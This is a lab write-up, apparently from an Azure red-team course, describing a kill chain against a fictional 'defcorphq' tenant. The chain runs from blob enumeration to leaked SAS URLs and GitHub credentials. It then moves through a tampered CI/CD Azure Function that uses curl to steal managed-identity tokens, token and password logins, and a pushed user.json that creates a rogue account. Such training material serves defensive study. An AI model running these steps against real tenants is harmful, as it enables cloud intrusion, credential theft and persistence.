 # Kill Chain 4
 ![KillChain](/img/KC-4.png "Kill Chain 4")

  ![KillChain](/img/KC4-ThreatMatrix.png "Kill Chain TheatMatrix")

  # Kill Chain 4
## (Objective 13, 19, 23 , 26)

13
1. Findout insecure storage blobs in the defcorphq tenant. We will use `MicroBurst` for enumerating storage accounts in the defcorphq tenant.
```powershell
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateBlobs.ps1
Invoke-EnumerateAzureBlobs -Base defcorp
```
2. Look for interesting information or secrets in the blob taht allow you to access another storage account. Look for the blob_client.py file and extract URL
 ![KillChain](/img/KC-4_1.png "Kill Chain 4")
3. Extract secrets from the second storage account . Open storage explorer and select SAS
 ![KillChain](/img/KC-4_2.png "Kill Chain 4")
4. Extract OTP app for laurenazad! Recall that we extract app.zip from one of the storage accounts. One of the files contained GitHub credentials for two users â€“ jenniferazad and laurenazad. 
 ![KillChain](/img/KC-4_3.png "Kill Chain 4")
5. Once logged in with OTP `studentx` folder has a code inside and triggers HTTP flow. This repo is a part of the CI/CD pipeline.**Once the code modified and called from URL!**
 ![KillChain](/img/KC-4_4.png "Kill Chain 4")
6. Abuse the github repo and get IDENTITY_ENDPOINT and IDENTITY_HEADER
 ![KillChain](/img/KC-4_5.png "Kill Chain 4")
7. Connect via got access token and client id
```powershell
$accesstoken = 'eyJ0eX....'
$account_id = '95f10eea-665....'
Connect-AzAccount -AccessToken $accesstoken -AccountId $account_id
```
8. List all accesable resources;
```powershell
Get-AzResourceGRoup
Get-AzREsourceGroupDeployment -ResourceGroupName SAP
```
 ![KillChain](/img/KC-4_6.png "Kill Chain 4")
9. Save the deployment locally
```powershell
Save-AzResourceGroupDeploymentTemplate -ResourceGroupName SAP -DeploymentName stevenking_defcorphq.onmicrosoft.com.sapsrv
```
 ![KillChain](/img/KC-4_7.png "Kill Chain 4")
10. Disconnect as authenticated managed identity and re-authenticate as user `Steven` and check if the user has access to any Azure resource;
```powershell
Disconnect-AzAccount

$password = ConvertTo-SecureString '@@#^(YanuGFASF569*8' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('stevencking@defcorphq.onmicrosoft.com', $Password)
Connect-AzAccount -Credential $creds
Get-AzResource
```
11. Check the user `Steven` has access to the `defcorpcodebackup` storage account. Check if there is a container that the user has access to:
```powershell
Get-AzStorageContainer -Context (Get-AzStorageAccount -Name defcorpcodebackup -ResourceGroupName Finance).Context
```
  If user doesn't have an authorization to perform this action let's try the storage explorer and check if we can access any container or blob using that.
   ![KillChain](/img/KC-4_8.png "Kill Chain 4")

12. With storage explorer we found `id_rsa` file for accessing github account with `SSH`
![KillChain](/img/KC-4_9.png "Kill Chain 4")
13. The README of this repo mentions that it can be used for creating users in Defcorphq tenant for accessing Enterprise Applications. There is an example `user.json` file on the below of the context. Commit the changes and push... And finally `studentx@defcorphq.onmicrosoft.com` created and added to a group!
![KillChain](/img/KC-4_10.png "Kill Chain 4")







 # Abuse CI/CD github repo
 ```python
 import logging, os
 import azure.functions as func

 def main(req: func.HttpRequest) -> func.HttpResponse:
   logging.info('Python HTTP trigger function processed a request.')
   IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
   IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
   cmd = 'curl "%s?resource=https://management.azure.com&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
   val = os.popen(cmd).read()
   return func.HttpResponse(val, status_code=200)
  ```


  # Create `user.json` file
  ```json
  {
    "accountEnabled": true,
    "displayName": "studentx",
    "mailNickname": "studentx",
    "userPrincipalName": "studentx@defcorphq.onmicrosoft.com",
    "passwordProfile" : {
      "forceChangePasswordNextSignIn": false,
      "password": "StudxPassword@123"
    }
  }
```